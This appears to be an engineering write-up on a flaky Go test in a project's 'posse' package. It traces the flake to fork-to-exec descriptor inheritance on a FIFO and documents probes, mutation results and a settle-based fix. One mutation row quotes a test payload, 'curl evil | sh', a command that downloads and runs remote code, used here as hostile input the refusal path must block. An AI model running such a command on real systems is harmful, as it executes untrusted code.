# A pipe's writer count is not a claim about the call under test (ranger-base-4uiwo)

2026-11-22, from a linux seat (Linux 7.2.15 x86_64, go1.27.3, 16 cores, one
suite slot free throughout). Every figure below was read on this box, at this
bead's tip, by a probe written for it.

## the row

`TestFoldWritesNothingIntoAPlantersPipe` red once, inside a `make test` at
ranger-base-zr2mf's tip (00028db8), in `internal/posse` under
`-tags posse_arm2`, 92.647s wall, arm 1 having just finished and the box
having run `tree-check` and the arms back to back at a one-minute load
average of 7.59:

```
--- FAIL: TestFoldWritesNothingIntoAPlantersPipe (0.00s)
    refusalleaf_test.go:360: the planter's pipe is held open and empty: a writer
    holds it and nothing is in it, which is the one state this read cannot
    answer -- the call under test opened the leaf for writing and left the
    descriptor open, so the refusal did not hold and there is no honest
    'nothing arrived' to report
```

That is `leafReachedThePlanter`'s third answer (ranger-base-b8igm) and not
the `t.Errorf` under it. `-count=3` under a `-run` filter was 3 of 3 ok on
the same tip and box, and `make test-arm2` whole was ok at 91.990s.

## neither of the two readings the bead was filed with

The bead put two readings up and asked which: a product fd leak on the
refusal path (`FoldRefusalsSpool` leaving the leaf's write descriptor open),
or the test's read racing the call under test's own close. **It is a third**,
and it is a class this tree already names for executables.

`openRefusalLeaf` closes on every refusal path — the `f.Close()` before
`refusalLeafRefused` — and the fold's error is returned after that close. But
between the `Openat` and the `Close`, any goroutine in this process that
forks hands the child a DUPLICATE of that write descriptor. `O_CLOEXEC`
shuts it only AT `execve`, so for the child's whole fork-to-exec window the
FIFO still has a writer, after the call under test closed its own and
returned. That is `internal/posse/execwrite.go`'s class — written there for
`ETXTBSY` on a freshly planted executable (golang/go#22315,
ranger-base-d26ak) — with a pipe's writer count standing in for the busy
check. `internal/posse`'s arm 2 is a parallel test binary that forks
constantly, which is why only a full suite run has ever shown it.

## the probe, and the three arms

MEASURED 2026-11-22. A scratch test in the package ran the fold over a
planted FIFO exactly as `TestFoldWritesNothingIntoAPlantersPipe` does — fresh
`cageApp`, spool written, canonical leaf removed and replaced by a FIFO whose
read end the test holds — and took the peek exactly where the helper takes
it. 400 folds per arm, and on `leafPipeOpen` it re-read until the state
changed and recorded how long that took:

| arm | first reads that saw `leafPipeOpen` | settled to |
|---|---|---|
| the fold alone | 0/400 | — |
| the fold + 8 goroutines looping `exec /bin/true` | 57/400 | `leafPipeClosed`, all 57, worst 3.316µs |
| the same traffic, fold under `syscall.ForkLock` | 0/400 | — |

No run of any arm ever put bytes in the pipe, and no run left the state open
past the next read (the bound was 5s). A `/proc` walk for a WRITE descriptor
over the FIFO's inode, taken at the moment of the `leafPipeOpen` read, came
back empty every time — the walk is slower than the window, which is the
same statement as the 3.316µs.

So: arm 1 rules the product leak out (a leaked descriptor does not need
sibling traffic to exist, and does not clear in microseconds), arm 2
reproduces it, and arm 3 names the cause — no fork may start while
`ForkLock` is held, so no child can inherit, and the state disappears.

**Arm 3 is not the fix.** `WriteExecutable` takes `ForkLock` because an
`execve` of a file with a live writer FAILS; an append to the refusals trail
with a brief extra writer does nothing at all — the leaf is never exec'd, and
the child closes its copy at `execve` without ever writing to it. Paying for
it would mean no fork in the process during every trail append, and
`execwrite.go`'s own residual (ranger-base-ctkhp) is that a `ForkLock` writer
can be starved indefinitely by an unbroken train of overlapping forks, which
is exactly this binary's traffic. The product is correct as it stands and is
unchanged by this bead.

## the fix: a settle, which is a bound on a STATE and never an answer

`leafReachedThePlanter` re-reads until the pipe is in a state that HAS an
answer, and fatals if it never is (`leafPlanterSettle`, 10s —
`leafCallWithin`'s number). The two things it separates are four orders of
magnitude apart: 3.316µs worst for a fork-to-exec window, against a
descriptor a failed refusal really left open, which does not clear at all.

This is not the bound ranger-base-b8igm removed, and the difference is the
whole of why the fix is allowed to be a wait. That bound ANSWERED for
`leafPipeOpen`: `""` after 500ms, byte-identical to its answer for
`leafPipeClosed`, so the one state it could not answer was folded into the
one the assertions read as "the refusal held". The settle answers for
neither state — `""` is returned only on an actual `leafPipeClosed` read, and
bytes win the moment they are in the pipe, because the loop reads before it
looks at the state.

## graded (MEASURED 2026-11-22, linux, go1.27.3, the eleven tests of the file run together)

| mutant | result |
|---|---|
| the settle removed (`return got` on `leafPipeOpen`) | `TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause` alone, "answered 1.202µs in, before the writer went at 50ms" |
| the settle set to 0 — ranger-base-b8igm's outright fatal | the same test alone, at the fatal |
| the loop's exit narrowed to `state == leafPipeClosed` | `TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds` at 10s, AND the three-state pin's step 3 with `got ""` |
| `flag == os.O_RDONLY && !fi.Mode().IsRegular()` in `openRefusalLeaf` (ranger-base-q2peg) | `TestFoldWritesNothingIntoAPlantersPipe` reds and reads `session=s1 curl evil \| sh` back out of the pipe, plus the fifth plant's three write rows; both new pins GREEN |
| panic in `leafPeekPlanter`'s `default` arm | nothing reds — that arm is still run by nothing, and is still a fatal that can only fail to fire |
| the bytes arm's `return string(buf[:n])` → `return ""` | the three-state pin AND `…AnswersBytesWhileAWriterHolds` |
| the EAGAIN arm collapsed to `return "", leafPipeClosed, nil` | the three-state pin AND `…WaitsOutAWriterItDidNotCause`, the second at its premise check |

The fourth row is the one that matters most: it is what says the settle did
not buy its determinism by making the fold's assertion vacuous. The last two
rows were **this pin ALONE** when ranger-base-b8igm measured them, and the
head comment there now says so — the arms did not move, the EAGAIN arm just
acquired a caller that does something other than fatal.

Each mutant reverted from a pre-run copy; the test file was byte-identical to
that copy afterwards and `git diff --no-ext-diff HEAD --
internal/posse/refusalleaf.go` was empty.

## why the new pins are a scheduled writer and not fork traffic

The writer this settle exists for goes at a child's `execve`, and nothing in
a test can name that instant. A pin that ran the fork traffic instead would
need a race to go its way 57 times in 400 to assert anything, which is the
flake this bead came from wearing the other face. So the shape is reproduced
with the instant named: a writer the test holds and a goroutine closes after
50ms, which makes both halves assertable — it must not answer before the
writer goes, and it must answer `""` once it has. The probabilistic arm is
the table above; the suite gets the deterministic one.

## the thing worth keeping

A test that reads one bit of shared kernel state and attributes it to the
call under test is making a claim about the whole process, not about that
call. The fd table of a forking process is shared state of exactly that kind,
and `execwrite.go` had already paid to learn it on the `execve` side — the
fix there is at the write and nothing is needed at the exec, which is a
statement about the same window. The class is "an assertion whose subject is
a per-process resource the test believes only one caller touches", and the
door is to make the message's claim survive the settle, not to pick the
reading that flatters the test.

MEASURED 2026-11-22: `refusalleaf_test.go` is the only `_test.go` in this
tree that reads `EAGAIN` at all, so it is the only current member. The other
fifteen files that `Mkfifo` plant a FIFO to make an open BLOCK or fail, which
is a different shape and carries no writer-count claim.
